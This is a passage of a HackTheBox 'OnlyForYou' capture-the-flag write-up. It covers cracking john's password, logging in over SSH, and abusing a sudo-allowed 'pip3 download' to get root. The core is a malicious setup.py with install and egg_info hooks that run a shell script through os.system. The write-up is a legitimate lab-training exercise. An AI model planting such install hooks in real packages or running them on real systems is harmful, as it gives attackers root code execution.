+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="s2">&#34;GET /?username=john HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span></code></pre></div><p>Cracking the <code>hashes</code> on the crackstation, we see that there is a hash which equals to <code>ThisIs4You</code> and that has belonged to <code>john</code> user:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_12.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">john</span><span class="p">:</span><span class="n">ThisIs4You</span>
+</span></span></code></pre></div><p>Now, we can login to the SSH via the obtained credentials:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_13.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Once logged in and checking if there is any command that could be ran by <code>john</code> user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">john</span><span class="nd">@only4you</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+</span></span><span class="line"><span class="cl"><span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">john</span> <span class="n">on</span> <span class="n">only4you</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span> <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">john</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">only4you</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pip3</span> <span class="n">download</span> <span class="n">http</span>\<span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span>\<span class="p">:</span><span class="mi">3000</span><span class="o">/*.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
+</span></span></code></pre></div><p>Now, searching for any privilege escalation online for the <code>pip download</code>, I stumbled on the following post:</p>
+<p><a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/" target="_blank" rel="noreferrer">https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/</a></p>
+<p>Following the post, I just changed the <code>[setup.py](http://setup.py)</code> and used <code>os.system</code> to execute the same shell script that I had downloaded previously to the machine:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span><span class="p">,</span> <span class="n">find_packages</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">setuptools.command.install</span> <span class="kn">import</span> <span class="n">install</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">setuptools.command.egg_info</span> <span class="kn">import</span> <span class="n">egg_info</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">RunCommand</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Hello, p0wnd!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;bash /tmp/shell.sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">RunEggInfoCommand</span><span class="p">(</span><span class="n">egg_info</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">RunCommand</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egg_info</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">RunInstallCommand</span><span class="p">(</span><span class="n">install</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">RunCommand</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">install</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">setup</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;this_is_fine_wuzzi&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">version</span> <span class="o">=</span> <span class="s2">&#34;0.0.1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">license</span> <span class="o">=</span> <span class="s2">&#34;MIT&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">packages</span><span class="o">=</span><span class="n">find_packages</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmdclass</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;install&#39;</span> <span class="p">:</span> <span class="n">RunInstallCommand</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;egg_info&#39;</span><span class="p">:</span> <span class="n">RunEggInfoCommand</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span></code></pre></div><p>Now, we can just upload the <code>tar.gz</code> file to a repository on<code>gogs</code> using <code>john</code> credentials and then execute the command:</p>
+<ul>
+<li>Note that in order to run the <code>sudo pip download</code> , it only accepted a <code>tar.gz</code> file downloaded from the port <code>3000</code> of the localhost, so we needed to upload the <code>tar.gz</code> file to the <code>gogs</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">john</span><span class="nd">@only4you</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tested_repo</span><span class="err">$</span> <span class="n">cp</span> <span class="o">../</span><span class="n">this_is_fine_wuzzi</span><span class="o">-</span><span class="mf">0.0.1</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span> <span class="n">xploited</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
+</span></span><span class="line"><span class="cl"><span class="n">john</span><span class="nd">@only4you</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tested_repo</span><span class="err">$</span> <span class="n">git</span> <span class="n">add</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">john</span><span class="nd">@only4you</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tested_repo</span><span class="err">$</span> <span class="n">git</span> <span class="n">commit</span> <span class="o">-</span><span class="n">m</span> <span class="s2">&#34;exp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">master</span> <span class="mi">675</span><span class="n">d20a</span><span class="p">]</span> <span class="n">exp</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">1</span> <span class="n">file</span> <span class="n">changed</span><span class="p">,</span> <span class="mi">0</span> <span class="n">insertions</span><span class="p">(</span><span class="o">+</span><span class="p">),</span> <span class="mi">0</span> <span class="n">deletions</span><span class="p">(</span><span class="o">-</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">create</span> <span class="n">mode</span> <span class="mi">100644</span> <span class="n">xploited</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
+</span></span><span class="line"><span class="cl"><span class="n">john</span><span class="nd">@only4you</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tested_repo</span><span class="err">$</span> <span class="n">git</span> <span class="n">push</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enumerating</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Counting</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">4</span><span class="o">/</span><span class="mi">4</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Delta</span> <span class="n">compression</span> <span class="n">using</span> <span class="n">up</span> <span class="n">to</span> <span class="mi">2</span> <span class="n">threads</span>
+</span></span><span class="line"><span class="cl"><span class="n">Compressing</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">3</span><span class="o">/</span><span class="mi">3</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">3</span><span class="o">/</span><span class="mi">3</span><span class="p">),</span> <span class="mf">2.94</span> <span class="n">KiB</span> <span class="o">|</span> <span class="mf">2.94</span> <span class="n">MiB</span><span class="o">/</span><span class="n">s</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Total</span> <span class="mi">3</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">0</span><span class="p">),</span> <span class="n">reused</span> <span class="mi">0</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Username</span> <span class="k">for</span> <span class="s1">&#39;http://127.0.0.1:3000&#39;</span><span class="p">:</span> <span class="n">john</span>
+</span></span><span class="line"><span class="cl"><span class="n">Password</span> <span class="k">for</span> <span class="s1">&#39;http://john@127.0.0.1:3000&#39;</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">To</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span><span class="n">john</span><span class="o">/</span><span class="n">tested_repo</span><span class="o">.</span><span class="n">git</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">947</span><span class="n">c79a</span><span class="o">.</span><span class="mf">.675</span><span class="n">d20a</span>  <span class="n">master</span> <span class="o">-&gt;</span> <span class="n">master</span>
+</span></span></code></pre></div><p>I uploaded the <code>tar.gz</code> via <code>git</code> command as the web application for the <code>gogs</code> was too buggy over the tunneling, then executing the command, resulted in <code>root</code> :</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_14.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/mailroom-htb/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Mailroom</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-08-19 00:00:00 &#43;0000 UTC">19 August 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/exploit-dev-egghunting/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Exploit Dev: EggHunting Explained</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-12-27 00:00:00 &#43;0000 UTC">27 December 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
